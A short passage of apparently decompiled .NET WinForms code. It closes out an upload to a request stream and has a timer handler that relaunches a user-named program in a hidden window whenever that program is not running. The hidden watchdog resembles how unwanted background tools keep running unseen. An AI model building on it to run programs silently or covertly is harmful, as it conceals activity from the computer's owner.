      requestStream.Write(buffer, 0, buffer.Length);
      requestStream.Close();
      requestStream.Dispose();
      this.Timer2.Enabled = true;
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
      if (Module1.IsAppRunning(this.TextBox1.Text))
        return;
      Interaction.Shell(this.TextBox1.Text, AppWinStyle.Hide);
    }
  }
}
